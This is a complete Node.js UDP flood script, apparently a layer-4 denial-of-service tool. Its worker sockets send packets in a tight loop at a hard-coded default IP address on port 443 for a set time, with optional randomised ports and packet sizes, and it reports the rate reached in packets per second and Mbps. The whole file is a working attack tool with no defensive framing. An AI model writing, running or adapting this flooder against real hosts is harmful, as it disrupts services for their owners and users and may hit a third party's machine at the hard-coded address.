'use strict';
const dgram = require('dgram');
const HOST = process.env.TARGET || '57.131.163.31';
const PORT = parseInt(process.env.PORT || '443', 10);
const SEC = parseInt(process.env.SEC || '60', 10);
const W = parseInt(process.env.WORKERS || '4', 10);
const SIZE = parseInt(process.env.SIZE || '1400', 10);
const RANDPORT = process.env.RANDPORT === '1';
const RANDSIZE = process.env.RANDSIZE === '1';
const buf = Buffer.alloc(SIZE, 65);
let sent = 0, bytes = 0;
const t0 = Date.now(), end = t0 + SEC * 1000;
function worker() {
  const s = dgram.createSocket('udp4');
  s.on('error', () => {});
  const loop = () => {
    if (Date.now() > end) { try { s.close(); } catch (e) {} return; }
    let n2 = 0;
    for (let n = 0; n < 32; n++) { n2++; const sz = RANDSIZE ? (64 + ((n2 * 7919) % 1337)) : SIZE; const prt = RANDPORT ? (1024 + ((n2 * 6151) % 64000)) : PORT; try { s.send(buf, 0, sz, prt, HOST); sent++; bytes += sz; } catch (e) {} }
    setImmediate(loop);
  };
  loop();
}
for (let i = 0; i < W; i++) worker();
setTimeout(() => {
  const dt = (Date.now() - t0) / 1000;
  console.log(`L4 sent=${sent} pps=${Math.round(sent / dt)} ${(bytes * 8 / 1e6 / dt).toFixed(0)}Mbps dur=${dt.toFixed(0)}s workers=${W} target=${HOST}:${PORT}`);
}, SEC * 1000 + 400);
